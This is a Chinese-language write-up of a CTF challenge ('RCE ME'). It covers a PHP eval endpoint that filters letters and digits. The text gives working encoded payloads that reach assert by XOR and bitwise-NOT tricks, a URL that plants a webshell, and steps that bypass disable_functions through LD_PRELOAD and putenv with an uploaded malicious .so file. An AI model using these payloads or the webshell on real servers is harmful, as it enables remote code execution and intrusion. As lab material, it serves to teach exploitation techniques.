## [极客大挑战 2019]RCE ME


直接给了源码

```php
<?php
error_reporting(0);
if(isset($_GET['code'])){
            $code=$_GET['code'];
                    if(strlen($code)>40){
                                        die("This is too Long.");
                                                }
                    if(preg_match("/[A-Za-z0-9]+/",$code)){
                                        die("NO.");
                                                }
                    @eval($code);
}
else{
            highlight_file(__FILE__);
}

// ?>
```

题目要我们RCE，但是把数字字母都过滤了，考虑只用符号写

一个网上经典的exp

```
?code=$_="`{{{"^"?<>/";;${$_}[_](${$_}[__]);&_=assert&__=执行的命令
```

然后出题人表示这不是预期解，应该把``_`'"^?<>${}]``也过滤掉的

给出的解法是

```php
?code=(~%9E%8C%8C%9A%8D%8B)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()));
//("assert")(("next")(("getallheaders")()));
```

在UA头里RCE

利用取反构造``(“assert”)()`` 

在php7里如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它

又因为PHP>7.1 时assert被定义为一种语言构造器，而不是一个函数，所以像eval一样不支持被可变函数调用

所以这段代码只能在php7.0中被利用

利用``print_f``和``scandir``fuzz一下可以看到flag在根目录下，但是无法读，还有个/readflag,可惜phpinfo里可以看到php自带的RCE函数比如system()都被禁用了。。。。

这里利用LD_PRELOAD与putenv来绕过

蚁剑连接

```
http://08eb3e97-4bf3-4dc0-b659-542c196dfd09.node3.buuoj.cn/?code=$_=%22`{{{%22^%22?%3C%3E/%22;;${$_}[_](${$_}[__]);&_=assert&__=eval($_REQUEST['eki'])
```

上传恶意.so .php文件（具体可见参考资料）

调用/readflag即可

```
http://08eb3e97-4bf3-4dc0-b659-542c196dfd09.node3.buuoj.cn/?code=$_=%22`{{{%22^%22?%3C%3E/%22;;${$_}[_](${$_}[__]);&_=assert&__=include(%27/tmp/233.php%27)&cmd=/readflag&outpath=/tmp/xx&sopath=/tmp/233.so
```

### 参考资料

深入浅出LD_PRELOAD & putenv():

[https://www.anquanke.com/post/id/175403](https://www.anquanke.com/post/id/175403)

利用的Exp:

[https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD)

出题人的博文：

[https://evoa.me/index.php/archives/62/](https://evoa.me/index.php/archives/62/)

phpRCE提高篇：

[https://ab-alex.github.io/2019/10/17/RCE%E6%8F%90%E9%AB%98%E7%AF%87/](https://ab-alex.github.io/2019/10/17/RCE%E6%8F%90%E9%AB%98%E7%AF%87/)